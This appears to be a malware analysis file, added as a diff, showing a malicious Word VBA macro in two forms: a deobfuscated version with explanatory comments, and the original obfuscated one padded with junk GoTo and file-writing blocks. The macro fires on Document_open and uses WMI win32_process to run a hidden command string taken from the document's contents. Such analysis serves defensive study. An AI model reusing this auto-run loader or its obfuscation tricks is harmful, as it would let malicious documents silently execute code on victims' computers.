@@ -1,0 +1,354 @@
+
+Deobfuscated_vba_script: -----------------------------------------------|
+
+
+Private Sub Document_open()
+Dn5440l_hb7
+End Sub
+
+Function Dn5440l_hb7()
+
+On Error Resume Next
+Pwpakrxjqhci6 = "H3c5_hufv8jcabt5U58aumvxubigihzb"
+sf4 = Null + Wm_t404p8v_.StoryRanges.Item(2 / 2) + Null ' sf4 = obfuscated cmd & powershell script on Dn5440l_hb7 Document
+t3s = "p"
+Shahvgsluly1 = "rocess"
+H28xnqjqdre3n2g2t = ":win32_"
+Kyklcj8d5dak20povy = "winmgmt"
+Pidl4mt91219jzdn = "" + Mid(Application.Name, 4 + 2, 2 - 1) + ""  '  Application Name= Microsoft Word, Pidl4mt91219jzdn = s  
+R0ty4lh4i_yv94lx8 = Kyklcj8d5dak20povy + Pidl4mt91219jzdn + H28xnqjqdre3n2g2t + t3s + Shahvgsluly1 ' winmgmt + s + :win32_ + p + rocess
+Hb94758udqnr = Replace_function(R0ty4lh4i_yv94lx8) ' Hb94758udqnr = winmgmts:win32_process
+Set Zpeehqbjjey = CreateObject(Hb94758udqnr) ' Set Zpeehqbjjey = CreateObject(winmgmts:win32_process)
+Tz4pisa96444x1 = Mid(sf4, (1 + 4), Len(sf4))
+Zpeehqbjjey.Create Replace_function(Tz4pisa96444x1), Null, Null 
+End Function
+
+Function Replace_function(Tx84obagfrrh42q)
+
+On Error Resume Next
+T_dehutl_mggmhizd = Tx84obagfrrh42q
+U0booztsqdpx = Replace_func_main(T_dehutl_mggmhizd)
+Replace_function = U0booztsqdpx
+End Function
+
+Function Replace_func_main(Ra1p5i7j_mc3)
+
+Vpeqsux9lcw7ketv_ = Lz6ghzf8pxt17d
+Replace_func_main = Replace(Ra1p5i7j_mc3, "]a"+"nw[3", W06apxljciw_nbacx)
+End Function
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------|
+---------------------------------------------------------------------------------------------------------------------------|
+
+
+
+
+
+Obfuscated_vba_script- ----------------------------------------------------------------------|
+
+
+
+Function Dn5440l_hb7()
+On Error Resume Next
+Pwpakrxjqhci6 = "H3c5_hufv8jcabt5" + "U58aumvxubigihzb"
+sf4 = P1x1ag4qbt2iq + Wm_t404p8v_.StoryRanges.Item(2 / 2) + Swvko0y1qshqgm_
+   GoTo VJbwzTDT
+Dim ChWZVJiB As Object
+Set RLurCDDF = EajdMLeD
+Set ChWZVJiB = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim VJbwzTDT As Object
+Set VJbwzTDT = ChWZVJiB.CreateTextFile("gMEpHB:\SKWvYCA\YtZqA.fQoAE")
+VJbwzTDT.WriteLine "WMwcBSqFohy"
+VJbwzTDT.WriteLine "HfXAPQQbXKJHFGu"
+VJbwzTDT.WriteLine "GDTGdEJpuRnDBFQ"
+Set XTdPHz = qpOWEIHHA
+VJbwzTDT.Close
+Set ChWZVJiB = Nothing
+Set sGvJJWh = yjNpyrf
+Set VJbwzTDT = Nothing
+VJbwzTDT:
+t3s = "]anw[3" + "p]anw[3"
+Shahvgsluly1 = "]an" + "w[3ro]anw[3]a" + "nw[3ce]anw[3s]anw[3s]anw[3]anw[3"
+   GoTo JhiYfXc
+Dim HnBvAEH As Object
+Set cTfCJ = SynsDAgHG
+Set HnBvAEH = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim JhiYfXc As Object
+Set JhiYfXc = HnBvAEH.CreateTextFile("ehLoAm:\PAVZiAGU\jVPHv.fAgoFBYmC")
+JhiYfXc.WriteLine "akTuJaIGmZrUyF"
+JhiYfXc.WriteLine "bAurYaGPwGKRiG"
+JhiYfXc.WriteLine "dvqIBFEqwfkI"
+Set pDPzBJmM = fUGQf
+JhiYfXc.Close
+Set HnBvAEH = Nothing
+Set FPWaF = gglHam
+Set JhiYfXc = Nothing
+JhiYfXc:
+H28xnqjqdre3n2g2t = "]anw[3:w]anw[3]anw[3i" + "n]anw[33]anw[32]anw[3_]anw[3"
+   GoTo DRrKpoA
+Dim xxYeFGUAH As Object
+Set HMyHCQCGu = reTrs
+Set xxYeFGUAH = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim DRrKpoA As Object
+Set DRrKpoA = xxYeFGUAH.CreateTextFile("eCzvxHN:\cgVnKGAT\YcnDi.YqiJOp")
+DRrKpoA.WriteLine "gcZaHCGUVJsFmL"
+DRrKpoA.WriteLine "OnehVAaWbfCAcAjsG"
+DRrKpoA.WriteLine "ohaTGaUTSwwDv"
+Set AiICOj = ukrnIFCE
+DRrKpoA.Close
+Set xxYeFGUAH = Nothing
+Set blQEM = syDRd
+Set DRrKpoA = Nothing
+DRrKpoA:
+Kyklcj8d5dak20povy = "w]anw[3in]anw[3m]an" + "w[3gm]anw[3t]anw[3]anw[3"
+   GoTo AybxtEBCJ
+Dim bGMXEIA As Object
+Set VbMBBgf = wuKBFvqI
+Set bGMXEIA = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim AybxtEBCJ As Object
+Set AybxtEBCJ = bGMXEIA.CreateTextFile("grPSDMS:\lQkJoR\aZMUgjGC.pVvhaH")
+AybxtEBCJ.WriteLine "SjDfYFUFPynYGu"
+AybxtEBCJ.WriteLine "yKdJWHAniqHFCB"
+AybxtEBCJ.WriteLine "JCgblEAJizSfW"
+Set cSHkDL = VwnpBElhO
+AybxtEBCJ.Close
+Set bGMXEIA = Nothing
+Set SfMKIOk = RvFOAEPH
+Set AybxtEBCJ = Nothing
+AybxtEBCJ:
+Pidl4mt91219jzdn = "]anw[3" + "]anw[3" + Mid(Application.Name, 4 + 2, 2 - 1) + "]anw[" + "3]anw[3"
+   GoTo uJSEDH
+Dim dLrgANHCG As Object
+Set CHKzNBD = vitXEH
+Set dLrgANHCG = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim uJSEDH As Object
+Set uJSEDH = dLrgANHCG.CreateTextFile("lBasV:\tFGoGJd\zBuHfBCN.AHGggII")
+uJSEDH.WriteLine "ncDMUIadusSIDx"
+uJSEDH.WriteLine "OcgtIFEeoIFhxt"
+uJSEDH.WriteLine "cGDcNrWsPeGCDF"
+Set numuq = oUWfJGBeE
+uJSEDH.Close
+Set dLrgANHCG = Nothing
+Set XDJPUW = EJEApM
+Set uJSEDH = Nothing
+uJSEDH:
+R0ty4lh4i_yv94lx8 = Kyklcj8d5dak20povy + Pidl4mt91219jzdn + H28xnqjqdre3n2g2t + t3s + Shahvgsluly1
+   GoTo tcYiEMeRH
+Dim RNgUODjsM As Object
+Set WtNcAKUFt = YzIkA
+Set RNgUODjsM = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim tcYiEMeRH As Object
+Set tcYiEMeRH = RNgUODjsM.CreateTextFile("FyNFG:\ugXUH\cZIFypIHj.tRULIINC")
+tcYiEMeRH.WriteLine "vRrzDEngIQvFPJfE"
+tcYiEMeRH.WriteLine "lHuxHADjraNFBgI"
+tcYiEMeRH.WriteLine "PzrrnIFtpmxAx"
+Set rfDgD = CCnbXRBeA
+tcYiEMeRH.Close
+Set RNgUODjsM = Nothing
+Set dTtuVsDVA = oMcHDXEF
+Set tcYiEMeRH = Nothing
+tcYiEMeRH:
+Hb94758udqnr = Bp63ahh3hb4hyq(R0ty4lh4i_yv94lx8)
+   GoTo gQxBD
+Dim PAxhJ As Object
+Set vtDUw = SOunIGkF
+Set PAxhJ = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim gQxBD As Object
+Set gQxBD = PAxhJ.CreateTextFile("dFVzNBE:\EBCOlEEOJ\KlKcJKk.SVIvoAEqG")
+gQxBD.WriteLine "WXovaGHxqSlUt"
+gQxBD.WriteLine "goMgGBdJMUDLAG"
+gQxBD.WriteLine "kWzGMzIVefGB"
+Set CmcBTTABc = XsKjcKE
+gQxBD.Close
+Set PAxhJ = Nothing
+Set MMAqSI = eWkHqVao
+Set gQxBD = Nothing
+gQxBD:
+Set Zpeehqbjjey = CreateObject(Hb94758udqnr)
+   GoTo RkPWCDPC
+Dim xkJxAAC As Object
+Set FgmzCEm = VfJHAA
+Set xkJxAAC = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim RkPWCDPC As Object
+Set RkPWCDPC = xkJxAAC.CreateTextFile("tLvao:\aGKUA\AhQhj.BDOQSJWG")
+RkPWCDPC.WriteLine "jVSXGfhYCxoHFD"
+RkPWCDPC.WriteLine "GqMIEnOQFEEDsE"
+RkPWCDPC.WriteLine "DkRmTYGAMxqHI"
+Set OtQPAJH = zOBhOx
+RkPWCDPC.Close
+Set xkJxAAC = Nothing
+Set NtpdEJDH = XjhOHEMDC
+Set RkPWCDPC = Nothing
+RkPWCDPC:
+Tz4pisa96444x1 = Mid(sf4, (1 + 4), Len(sf4))
+   GoTo JADCpjk
+Dim rEeiBJ As Object
+Set jPnRGLC = waSbS
+Set rEeiBJ = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim JADCpjk As Object
+Set JADCpjk = rEeiBJ.CreateTextFile("VxskFWpm:\cuyOFYrFJ\SZSlaGJZi.TeBYCDZ")
+JADCpjk.WriteLine "bOOXnOJYtbRAbm"
+JADCpjk.WriteLine "eSpcpGDZncccrFb"
+JADCpjk.WriteLine "fUwLgjVtQyH"
+Set VusSK = QrVtQr
+JADCpjk.Close
+Set rEeiBJ = Nothing
+Set CbMZSLFAM = MfgnKGWI
+Set JADCpjk = Nothing
+JADCpjk:
+   GoTo eUdbDAHHs
+Dim DyjPBI As Object
+Set CksLJVJ = yUWxTlVAC
+Set DyjPBI = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim eUdbDAHHs As Object
+Set eUdbDAHHs = DyjPBI.CreateTextFile("OPLPBI:\fNyAExIq\jrtno.FyobBAAFE")
+eUdbDAHHs.WriteLine "OTLmJCwhyQMFzlB"
+eUdbDAHHs.WriteLine "TthascRlxHZH"
+eUdbDAHHs.WriteLine "frvvJFHIkftmZHE"
+Set NBjEFGnEA = IYKcgC
+eUdbDAHHs.Close
+Set DyjPBI = Nothing
+Set ORIzFDySE = ThHBBDu
+Set eUdbDAHHs = Nothing
+eUdbDAHHs:
+Zpeehqbjjey.Create Bp63ahh3hb4hyq(Tz4pisa96444x1), Rua2q5h93ydvt, Ijq0g4n16u9apwecr
+   GoTo njKwJdA
+Dim XwZxsHCGt As Object
+Set aLGptGA = QEIFFM
+Set XwZxsHCGt = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim njKwJdA As Object
+Set njKwJdA = XwZxsHCGt.CreateTextFile("TNJvoD:\walkrfAE\EalrWFWTE.wDSOEJ")
+njKwJdA.WriteLine "BQumCJmmiAGIKv"
+njKwJdA.WriteLine "HiTyACJmCuGQFFJ"
+njKwJdA.WriteLine "TJahKRWdrvHFIy"
+Set NFWzF = rJqMZII
+njKwJdA.Close
+Set XwZxsHCGt = Nothing
+Set xNJyUCNg = JHrNWdBsW
+Set njKwJdA = Nothing
+njKwJdA:
+   GoTo PmBxcD
+Dim rgBSB As Object
+Set VAEDpBCV = PGiog
+Set rgBSB = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim PmBxcD As Object
+Set PmBxcD = rgBSB.CreateTextFile("PkeJHBJJH:\ODJMGCw\NefpJHvCX.XzgyeCQuA")
+PmBxcD.WriteLine "HwixyOCYxmojd"
+PmBxcD.WriteLine "xtsHGQjpNzDIYJ"
+PmBxcD.WriteLine "koDuGqAOJBlLgZIEme"
+Set TxAVq = NSiRQzd
+PmBxcD.Close
+Set rgBSB = Nothing
+Set aTfPCap = txKQv
+Set PmBxcD = Nothing
+PmBxcD:
+End Function
+
+Function Bp63ahh3hb4hyq(Tx84obagfrrh42q)
+On Error Resume Next
+   GoTo oOysMtDG
+Dim xCaTC As Object
+Set RUMGE = rtGyqOth
+Set xCaTC = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim oOysMtDG As Object
+Set oOysMtDG = xCaTC.CreateTextFile("Oafyb:\RPNGMA\cmOgEyD.EEpGjE")
+oOysMtDG.WriteLine "rVpvDaGGxNfeNUF"
+oOysMtDG.WriteLine "dWnMFoTBPDqeJK"
+oOysMtDG.WriteLine "budRDJKVnJRU"
+Set GNnZJzE = wUoJIFDD
+oOysMtDG.Close
+Set xCaTC = Nothing
+Set bGnhXCA = XKPUEfhk
+Set oOysMtDG = Nothing
+oOysMtDG:
+T_dehutl_mggmhizd = Tx84obagfrrh42q
+   GoTo hiZkEEF
+Dim hSbDPCC As Object
+Set EbuwEJS = xOnWA
+Set hSbDPCC = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim hiZkEEF As Object
+Set hiZkEEF = hSbDPCC.CreateTextFile("pygNv:\znIpFIR\yniMs.nmiIGDEDA")
+hiZkEEF.WriteLine "bVawaPADALVlWFFA"
+hiZkEEF.WriteLine "lRcGHADAHrlHJJA"
+hiZkEEF.WriteLine "utFMeJhUKJhJ"
+Set zOQlGPVC = kboRA
+hiZkEEF.Close
+Set hSbDPCC = Nothing
+Set pSFXACJ = wCjuwBBGN
+Set hiZkEEF = Nothing
+hiZkEEF:
+U0booztsqdpx = Y4o_ocvl0jti6oho0r(T_dehutl_mggmhizd)
+   GoTo UPhhYZEF
+Dim lEOlGYxK As Object
+Set nKtfECko = HOkLRDGd
+Set lEOlGYxK = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim UPhhYZEF As Object
+Set UPhhYZEF = lEOlGYxK.CreateTextFile("sojcFeJ:\zxDxYHq\rNbtS.PtHuEEP")
+UPhhYZEF.WriteLine "ozrZBTZBTMMIBB"
+UPhhYZEF.WriteLine "uJnfBHIPFKBxHBmEE"
+UPhhYZEF.WriteLine "ZRotGHIxyrpSqvsXCC"
+Set WxujBIAMz = eBddHTXP
+UPhhYZEF.Close
+Set lEOlGYxK = Nothing
+Set mmkTuwH = TFXNGIiH
+Set UPhhYZEF = Nothing
+UPhhYZEF:
+Bp63ahh3hb4hyq = U0booztsqdpx
+   GoTo bPFNuJ
+Dim VcIiQJFi As Object
+Set yyoqEHETu = lgZgGO
+Set VcIiQJFi = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim bPFNuJ As Object
+Set bPFNuJ = VcIiQJFi.CreateTextFile("gNgYGZ:\CatdBMGGg\qGsdAdOQH.cJsxtdJE")
+bPFNuJ.WriteLine "PFQdBLHsDnfTZv"
+bPFNuJ.WriteLine "BWSOKPyHMnSQxi"
+bPFNuJ.WriteLine "cnLcFxEphoEbAFA"
+Set iytziJ = UMzHfyAfA
+bPFNuJ.Close
+Set VcIiQJFi = Nothing
+Set kskMAAHA = zgBjJOGEH
+Set bPFNuJ = Nothing
+bPFNuJ:
+End Function
+
+Function Y4o_ocvl0jti6oho0r(Ra1p5i7j_mc3)
+Vpeqsux9lcw7ketv_ = Lz6ghzf8pxt17d
+   GoTo OBwIBy
+Dim QZjuH As Object
+Set SFmrEDJ = nIHrI
+Set QZjuH = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim OBwIBy As Object
+Set OBwIBy = QZjuH.CreateTextFile("EEGvGuF:\XrXnHGDDB\noadJZ.yGcKj")
+OBwIBy.WriteLine "dxIGdcCHBKYgde"
+OBwIBy.WriteLine "ALpzEMcwuWl"
+OBwIBy.WriteLine "GhifcDKlpA"
+Set WSARpB = yJouG
+OBwIBy.Close
+Set QZjuH = Nothing
+Set FTalMbF = LVadAF
+Set OBwIBy = Nothing
+OBwIBy:
+Y4o_ocvl0jti6oho0r = Replace(Ra1p5i7j_mc3, "]a" + "nw[3", W06apxljciw_nbacx)
+   GoTo EUMDPGt
+Dim UUoAB As Object
+Set zLkRiC = fUDmDCt
+Set UUoAB = CreateObject(Bp63ahh3hb4hyq("]anw[3Sc]anw[3ripti]anw[3ng.Fil]anw[3eSyst]anw[3emOb]anw[3ject]anw[3"))
+Dim EUMDPGt As Object
+Set EUMDPGt = UUoAB.CreateTextFile("XFtOCOULb:\dMKcFHF\GAGPCEp.ZPnnAM")
+EUMDPGt.WriteLine "TOSxJaIzCudpDlB"
+EUMDPGt.WriteLine "qMnfwCwbPJC"
+EUMDPGt.WriteLine "MvkIFCHFTnRqD"
+Set EVOuqJnGD = ItSfCDCB
+EUMDPGt.Close
+Set UUoAB = Nothing
+Set vutdEkdRL = ilONFzHG
+Set EUMDPGt = Nothing
+EUMDPGt:
+End Function
+
+
+
+
